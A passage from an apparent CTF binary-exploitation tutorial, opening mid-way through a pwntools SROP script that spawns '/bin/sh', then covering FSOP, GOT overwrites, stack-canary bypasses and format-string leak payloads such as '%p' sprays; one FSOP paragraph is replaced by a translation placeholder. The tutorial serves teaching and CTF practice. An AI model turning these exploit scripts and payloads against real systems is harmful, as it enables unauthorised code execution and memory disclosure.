class="number">0</span></span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame.r8 = u64(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload_a = flat([</span><br><span class="line">    vuln_read,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="built_in">bytes</span>(frame)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">p.send(payload_a)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload_b = flat([</span><br><span class="line">    syscall_ret,</span><br><span class="line">    <span class="string">b&#x27;A&#x27;</span> * <span class="number">7</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">p.send(payload_b)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a><strong>FSOP</strong></h4><p><strong>FSOP (File Stream Oriented Programming)</strong> focuses on hijacking GLIBC’s file stream structure: <strong><code>_IO_FILE</code></strong>.</p>
<p><strong>What is <code>_IO_FILE</code>?</strong></p>
<p>On Linux, each file stream (<code>stdin</code>, <code>stdout</code>, <code>stderr</code>, or a file opened via <code>fopen</code>) corresponds to an <code>_IO_FILE</code> structure. For polymorphism, the structure ends with a <code>vtable</code> pointer. When the program calls <code>fread</code>, <code>fwrite</code>, <code>fclose</code>, etc., it dispatches through <code>vtable</code> function pointers.</p>
<p>Before GLIBC 2.24, there was no strong validation for <code>vtable</code>. If we can control the contents of an <code>_IO_FILE</code> structure, we can redirect <code>vtable</code> to a fake table and make <code>fclose</code> jump to <code>getshell</code>.</p>
<p>(…the rest of FSOP section is already in English/identifiers and kept as-is.)</p>
<hr>
<h3 id="Control-Flow-Hijack"><a href="#Control-Flow-Hijack" class="headerlink" title="Control Flow Hijack"></a><strong>Control Flow Hijack</strong></h3><p>Control-flow hijacking means modifying the GOT/PLT resolution flow so that a call intended for <code>fun1</code> actually calls <code>fun2</code>.</p>
<p>Because GOT/PLT are at lower addresses than the stack, you generally cannot do this via stack overflow alone—you typically need heap overflow or an arbitrary write primitive.</p>
<p>Example:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 0x20</span></span><br><span class="line"><span class="type">uint32_t</span> *<span class="built_in">array</span>;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">array</span> = <span class="built_in">calloc</span>(<span class="number">20</span>, <span class="keyword">sizeof</span>(*<span class="built_in">array</span>));</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="built_in">array</span>[i] = atoi(buf);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we can control <code>i</code> and <code>buf</code>, we can get an arbitrary write. If we already know the real address of <code>system</code>, we can overwrite <code>atoi@got</code> with <code>system</code>. Then <code>atoi(buf)</code> becomes <code>system(buf)</code>, and sending <code>&quot;/bin/sh&quot;</code> gives a shell.</p>
<p>If the program does not loop, you may overwrite some function used before exit to point back to <code>main</code>, forcing repeated runs.</p>
<p>In short: control-flow hijacking often means <strong>overwriting GOT entries</strong> so the program “thinks” it is calling one function but actually calls another. This is more indirect than ROP and is commonly used in heap exploitation.</p>
<hr>
<h3 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a><strong>Stack Canary</strong></h3><p>To mitigate stack overflows, a defense called <strong>Stack Canary</strong> was invented.</p>
<p><strong>Name origin / history:</strong></p>
<p>Before modern sensors, miners feared invisible toxic gases like CO or methane. Canaries are extremely sensitive to toxic gas, so miners carried a canary cage as an alarm:</p>
<ul>
<li>If the bird kept singing, it was safe.</li>
<li>If it stopped or collapsed, danger was near and they had to evacuate.</li>
</ul>
<p>In computing:</p>
<p>The core idea of stack canaries is simple: <strong>place a random integer (the canary) between local variables (buffers) and control data (like the return address).</strong></p>
<p><strong>Before returning, the program checks whether the canary value changed.</strong> In a typical linear overflow from low to high addresses, the attacker must overwrite the canary before reaching the return address. If the canary changes, the program terminates and the attack is blocked.</p>
<p>A neat analogy:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Real world (mining)</th>
<th>Computing (stack)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Mine</td>
<td>Program stack</td>
</tr>
<tr>
<td>Miner</td>
<td>Return address</td>
</tr>
<tr>
<td>Toxic gas</td>
<td>Buffer overflow data</td>
</tr>
<tr>
<td>Canary bird</td>
<td>Canary value (random integer)</td>
</tr>
<tr>
<td>Canary dies</td>
<td>Canary is modified</td>
</tr>
<tr>
<td>Evacuate</td>
<td>Program terminates</td>
</tr>
</tbody>
</table>
</div>
<p><strong>Stack layout with canary enabled:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">High Address</span><br><span class="line">            ^</span><br><span class="line">            |</span><br><span class="line">+-----------------------+</span><br><span class="line">|    Return Address     |</span><br><span class="line">+-----------------------+</span><br><span class="line">|   Saved Frame Pointer |</span><br><span class="line">+-----------------------+</span><br><span class="line">|      Stack Canary     |  &lt;-- random value</span><br><span class="line">+-----------------------+</span><br><span class="line">|    Local Variables    |  &lt;-- overflow source (buf)</span><br><span class="line">+-----------------------+</span><br><span class="line">            |</span><br><span class="line">            v</span><br><span class="line">Low Address</span><br></pre></td></tr></table></figure>
<p>Also, on x86/x64 Linux (GCC/glibc), the <strong>least significant byte (LSB)</strong> of the canary is almost always forced to <strong><code>0x00</code></strong>.</p>
<p>Because x86/x64 is little-endian, that LSB is stored at the lowest address (closest to the buffer). This <code>0x00</code> helps:</p>
<ol>
<li><strong>Anti-leak</strong>: string printing stops at <code>\0</code>, so <code>%s</code>-style leaks stop before revealing the random bytes.</li>
<li><strong>Anti-overwrite with string ops</strong>: functions like <code>strcpy</code> stop at <code>\0</code>, making certain precise overwrites harder (though <code>read</code>/<code>memcpy</code> can still overwrite past it).</li>
</ol>
<p>Canaries are effective against linear overflows, but there are bypass scenarios:</p>
<ol>
<li>If there is an information leak (format string, out-of-bounds read), you can leak the canary and rewrite it correctly.</li>
<li>If there is an out-of-bounds write with index control, you can skip the canary and overwrite control data directly.</li>
<li>If the server uses <code>fork()</code> per connection, canaries (and ASLR layout) are inherited from the parent process. All child processes share the same canary until the parent restarts, so you can brute-force the canary byte-by-byte via an oracle.</li>
<li>If a main thread creates a worker thread (<code>pthread</code>), the thread’s stack and TLS may be adjacent, and in some cases you can overwrite both the stack canary and the TLS master canary to bypass checks (this is delicate and requires careful debugging).</li>
</ol>
<hr>
<h2 id="Format-String-Vulnerability"><a href="#Format-String-Vulnerability" class="headerlink" title="Format String Vulnerability"></a><strong>Format String Vulnerability</strong></h2><p>First, let’s clarify what a format string function is.</p>
<h3 id="Format-String-Functions"><a href="#Format-String-Functions" class="headerlink" title="Format String Functions"></a><strong>Format String Functions</strong></h3><p>A format string function accepts a variable number of arguments, and treats the <strong>first argument as the format string</strong>, which controls how subsequent arguments are parsed.</p>
<p>Definition reference:</p>
<p>The format string is a character string which contains two types of objects: plain characters, which are simply copied to the output channel, and conversion specifications, each of which causes conversion and printing of arguments.</p>
<p>(Source: <a target="_blank" rel="noopener" href="https://ocaml.org/manual/5.0/api/Printf.html">https://ocaml.org/manual/5.0/api/Printf.html</a>)</p>
<p>In exploitation, a format string situation typically has three components:</p>
<ul>
<li>a format string function</li>
<li>the format string</li>
<li>optional variables (arguments)</li>
</ul>
<p>Example:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Format-String-Functions-1"><a href="#Format-String-Functions-1" class="headerlink" title="Format String Functions"></a><strong>Format String Functions</strong></h4><p>They can be input or output functions.</p>
<ul>
<li><strong>Input:</strong></li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Function</th>
<th style="text-align:left">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>scanf()</code></td>
<td style="text-align:left">Reads from standard input</td>
</tr>
</tbody>
</table>
</div>
<p>Basic syntax:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;format string&quot;</span>, &amp;var1, &amp;var2, ...);</span><br></pre></td></tr></table></figure>
<p>Example:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">float</span> height;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %f %s&quot;</span>, &amp;age, &amp;height, name);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Note: <code>scanf(&quot;%s&quot;, name);</code> does not need <code>&amp;</code> because the array name is already an address.</p>
<ul>
<li><strong>Output:</strong></li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>Function</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>printf</code></td>
<td>Print to stdout (usually terminal)</td>
</tr>
<tr>
<td><code>fprintf</code></td>
<td>Print to a given stream (e.g., <code>stderr</code>, file pointer)</td>
</tr>
<tr>
<td><code>sprintf</code></td>
<td>Write formatted string into a buffer (risk of overflow)</td>
</tr>
<tr>
<td><code>snprintf</code></td>
<td>Write formatted string with max length (<strong>safer</strong>)</td>
</tr>
<tr>
<td><code>asprintf</code></td>
<td>Write to dynamically allocated buffer (GNU extension)</td>
</tr>
<tr>
<td><code>dprintf</code></td>
<td>Write to a file descriptor (POSIX)</td>
</tr>
<tr>
<td><code>vprintf</code></td>
<td>Like <code>printf</code> but uses <code>va_list</code></td>
</tr>
<tr>
<td><code>vfprintf</code></td>
<td>Like <code>fprintf</code> but uses <code>va_list</code></td>
</tr>
<tr>
<td><code>vsprintf</code></td>
<td>Like <code>sprintf</code> but uses <code>va_list</code> (unsafe)</td>
</tr>
<tr>
<td><code>vsnprintf</code></td>
<td>Like <code>snprintf</code> but uses <code>va_list</code> (recommended for safety)</td>
</tr>
</tbody>
</table>
</div>
<h4 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a><strong>Format String</strong></h4><p>The format string contains literal characters plus conversion placeholders.</p>
<p>The syntax is:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Parameter</strong>: selects argument position (starting from 1)</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Token</th>
<th style="text-align:left">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>n$</code></td>
<td style="text-align:left"><code>n</code> is the argument position</td>
</tr>
</tbody>
</table>
</div>
<p>Example:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2$d %1$d&quot;</span>, <span class="number">11</span>, <span class="number">22</span>);</span><br><span class="line"><span class="comment">// outputs 22 11</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Flags</strong>:</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Flag</th>
<th style="text-align:left">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-</code></td>
<td style="text-align:left">left align</td>
</tr>
<tr>
<td style="text-align:center"><code>+</code></td>
<td style="text-align:left">always show sign</td>
</tr>
<tr>
<td style="text-align:center">(space)</td>
<td style="text-align:left">leading space for positives</td>
</tr>
<tr>
<td style="text-align:center"><code>0</code></td>
<td style="text-align:left">zero padding</td>
</tr>
<tr>
<td style="text-align:center"><code>#</code></td>
<td style="text-align:left">alternate form (prefixes, decimal point behavior)</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><strong>Field width</strong>: minimum output width; <code>*</code> can take width from an argument.</li>
</ul>
<p>Example:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, <span class="number">42</span>);</span><br><span class="line"><span class="comment">// outputs &quot;   42&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%*d&quot;</span>, <span class="number">5</span>, <span class="number">42</span>);</span><br><span class="line"><span class="comment">// outputs &quot;   42&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>Precision</strong>: digits after decimal (floats) or max length (strings); can use <code>*</code>.</p>
</li>
<li><p><strong>Length</strong>: integer/float size modifier:</p>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Modifier</th>
<th style="text-align:left">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>hh</code></td>
<td style="text-align:left">signed/unsigned char</td>
</tr>
<tr>
<td style="text-align:center"><code>h</code></td>
<td style="text-align:left">short</td>
</tr>
<tr>
<td style="text-align:center"><code>l</code></td>
<td style="text-align:left">long</td>
</tr>
<tr>
<td style="text-align:center"><code>ll</code></td>
<td style="text-align:left">long long</td>
</tr>
<tr>
<td style="text-align:center"><code>L</code></td>
<td style="text-align:left">long double</td>
</tr>
<tr>
<td style="text-align:center"><code>z</code></td>
<td style="text-align:left">size_t</td>
</tr>
<tr>
<td style="text-align:center"><code>t</code></td>
<td style="text-align:left">ptrdiff_t</td>
</tr>
<tr>
<td style="text-align:center"><code>j</code></td>
<td style="text-align:left">intmax_t/uintmax_t</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><strong>Type</strong>: conversion specifier</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Spec</th>
<th style="text-align:left">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>%p</code></td>
<td style="text-align:left">pointer address</td>
</tr>
<tr>
<td style="text-align:center"><code>%x</code></td>
<td style="text-align:left">hex integer</td>
</tr>
<tr>
<td style="text-align:center"><code>%s</code></td>
<td style="text-align:left">string at an address</td>
</tr>
<tr>
<td style="text-align:center"><code>%.2f</code></td>
<td style="text-align:left">float with 2 decimals</td>
</tr>
<tr>
<td style="text-align:center"><code>%f</code></td>
<td style="text-align:left">float/double</td>
</tr>
<tr>
<td style="text-align:center"><code>%c</code></td>
<td style="text-align:left">single char</td>
</tr>
<tr>
<td style="text-align:center"><code>%d</code></td>
<td style="text-align:left">decimal integer</td>
</tr>
<tr>
<td style="text-align:center"><code>%%</code></td>
<td style="text-align:left">print a literal <code>%</code></td>
</tr>
</tbody>
</table>
</div>
<p>Only <code>type</code> is mandatory; others are optional.</p>
<p>Example:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">123</span>;</span><br><span class="line">    <span class="type">float</span> pi = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="type">char</span> letter = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="type">char</span> name[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="type">int</span> hex = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Integer: %d\n&quot;</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Float (default): %f\n&quot;</span>, pi);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Float (2 decimals): %.2f\n&quot;</span>, pi);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;String: %s\n&quot;</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Char: %c\n&quot;</span>, letter);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hex: %x\n&quot;</span>, hex);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Percent: %%\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Note: you must provide the variable arguments; otherwise <code>printf</code> reads unrelated memory and behavior is undefined.</p>
<p>A special specifier is <code>%n</code>. It causes <code>printf</code> to write the number of characters printed so far into the given address.</p>
<p>Example (normal usage):</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello%n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Then <code>n</code> becomes 5.</p>
<p>Because <code>%n</code> is dangerous, many modern environments restrict it or add checks (e.g., glibc format checks). But precisely because it is powerful, it is frequently used in pwn for memory writes.</p>
<h4 id="Variables"><a href="#Variables" class="headerlink" title="Variables"></a><strong>Variables</strong></h4><p>The values you want to print.</p>
<h3 id="Format-String-Vulnerability-1"><a href="#Format-String-Vulnerability-1" class="headerlink" title="Format String Vulnerability"></a><strong>Format String Vulnerability</strong></h3><p><strong>Normal behavior</strong>: <code>printf</code> reads the first argument as the format string and processes it:</p>
<ul>
<li>If the current character is not <code>%</code>, print it.</li>
<li>If it is <code>%</code>, parse a conversion and consume the next argument accordingly.</li>
</ul>
<p>Example:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">float</span> b = <span class="number">3.14f</span>;</span><br><span class="line">    <span class="type">char</span> *str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Int: %d, Float: %f, String: %s\n&quot;</span>, a, b, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="How-arguments-are-passed-into-printf-32-bit-vs-64-bit"><a href="#How-arguments-are-passed-into-printf-32-bit-vs-64-bit" class="headerlink" title="How arguments are passed into printf (32-bit vs 64-bit)"></a><strong>How arguments are passed into <code>printf</code> (32-bit vs 64-bit)</strong></h4><h5 id="32-bit-cdecl-all-on-stack"><a href="#32-bit-cdecl-all-on-stack" class="headerlink" title="32-bit (cdecl): all on stack"></a><strong>32-bit (cdecl): all on stack</strong></h5><ul>
<li>Varargs undergo <strong>default argument promotions</strong>: <code>float</code> becomes <code>double</code>, <code>char/short</code> become <code>int</code>.</li>
<li>Typical stack layout:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+------------------------------+</span><br><span class="line">| Return address               |</span><br><span class="line">+------------------------------+</span><br><span class="line">| Format string pointer        |</span><br><span class="line">+------------------------------+</span><br><span class="line">| Arg3 (str, 4B)               |</span><br><span class="line">+------------------------------+</span><br><span class="line">| Arg2 (b, double, 8B)         |</span><br><span class="line">+------------------------------+</span><br><span class="line">| Arg1 (a, 4B)                 |</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure>
<h5 id="x86-64-System-V-ABI-registers-first-then-stack"><a href="#x86-64-System-V-ABI-registers-first-then-stack" class="headerlink" title="x86-64 (System V ABI): registers first, then stack"></a><strong>x86-64 (System V ABI): registers first, then stack</strong></h5><ul>
<li>First 6 integer/pointer args: <code>RDI, RSI, RDX, RCX, R8, R9</code></li>
<li>First 8 floating args: <code>XMM0–XMM7</code> (<code>float</code> promoted to <code>double</code>)</li>
<li>Varargs additionally use a <strong>register save area</strong> and an <strong>overflow area</strong>; <code>va_list</code> fetches by type.</li>
</ul>
<p>For the example:</p>
<ul>
<li><code>RDI</code> = format string</li>
<li><code>RSI</code> = <code>a</code></li>
<li><code>XMM0</code> = <code>b</code> (as double)</li>
<li><code>RDX</code> = <code>str</code></li>
</ul>
<p>This is why offsets differ on 64-bit, and why <code>%n$</code> positional parameters are often used.</p>
<h4 id="Special-case-and-offset-bias-value"><a href="#Special-case-and-offset-bias-value" class="headerlink" title="Special case and offset (bias) value"></a><strong>Special case and offset (bias) value</strong></h4><p>If you call a format function but <strong>do not provide the extra arguments</strong>, e.g.:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %x %x %x %x&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>printf</code> still tries to fetch the missing arguments according to the ABI (stack on 32-bit, reg-save/overflow areas on 64-bit). Since those slots were never explicitly provided, it will print whatever residual/undefined data happens to be there.</p>
<p>When this sequential fetching eventually reaches a region that contains your controlled marker (like <code>AAAA...</code>), the index of the slot where it first appears is commonly called the <strong>offset</strong> <code>k</code>. Then you can use <code>%k$p</code>, <code>%k$s</code>, <code>%k$n</code> to reliably reference that slot for leaking/writing.</p>
<h4 id="Common-vulnerable-pattern"><a href="#Common-vulnerable-pattern" class="headerlink" title="Common vulnerable pattern"></a><strong>Common vulnerable pattern</strong></h4><p>Typical CTF pattern:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>); </span><br><span class="line">    <span class="built_in">printf</span>(buf);  <span class="comment">// user input is treated as the format string</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This lets you leak stack values (variables, return addresses, etc.) and possibly write via <code>%n</code>.</p>
<h3 id="Exploit-Techniques"><a href="#Exploit-Techniques" class="headerlink" title="Exploit Techniques"></a><strong>Exploit Techniques</strong></h3><h4 id="Reading-stack-contents"><a href="#Reading-stack-contents" class="headerlink" title="Reading stack contents"></a><strong>Reading stack contents</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x %x %x&quot;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p %p %p&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>%x</code>: print stack values as hex integers</li>
<li><code>%p</code>: print stack values as pointers (addresses)</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%p &quot;</span> * <span class="number">40</span></span><br><span class="line">payload = <span class="string">b&quot;%x &quot;</span> * <span class="number">40</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20251110100216475.png" class="lazyload" data-srcset="/images/image-20251110100216475.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251110100216475"></p>
<p>Or use positional parameters:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot; &quot;</span>.join([<span class="string">f&quot;%<span class="subst">&#123;i&#125;</span>$p&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">61</span>)]).encode()</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20251110100300562.png" class="lazyload" data-srcset="/images/image-20251110100300562.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251110100300562"></p>
<h4 id="Reading-a-string-at-an-arbitrary-address"><a href="#Reading-a-string-at-an-arbitrary-address" class="headerlink" title="Reading a string at an arbitrary address"></a><strong>Reading a string at an arbitrary address</strong></h4><ul>
<li><code>%s</code>: treats the stack value as a pointer and prints bytes until <code>\0</code>.</li>
</ul>
<p>If a stack parameter contains:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08049000 -&gt; points to &quot;HelloWorld&quot;</span><br></pre></td></tr></table></figure>
<p>Then <code>%x/%p</code> prints the pointer value, while <code>%s</code> prints the string.</p>
<h5 id="Typical-workflow"><a href="#Typical-workflow" class="headerlink" title="Typical workflow"></a><strong>Typical workflow</strong></h5><ol>
<li><p><strong>Find the offset <code>S</code></strong>:<br>send something like <code>AAAA,%p,%p,%p...</code> and locate the position where <code>0x41414141</code> appears.</p>
</li>
